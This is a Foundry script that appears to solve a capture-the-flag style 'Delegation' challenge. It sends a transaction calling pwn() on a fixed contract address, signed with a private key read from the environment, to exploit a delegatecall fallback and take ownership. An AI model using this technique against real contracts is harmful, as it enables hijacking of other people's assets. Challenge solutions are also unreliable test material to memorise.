// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {Delegate, Delegation} from "../src/Deligation.sol";

contract DelegationScript is Script {
    Delegation public code = Delegation(0xa03dD55C1A019DeB7D3656175558C6537ad5F7F2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        address(code).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }
}
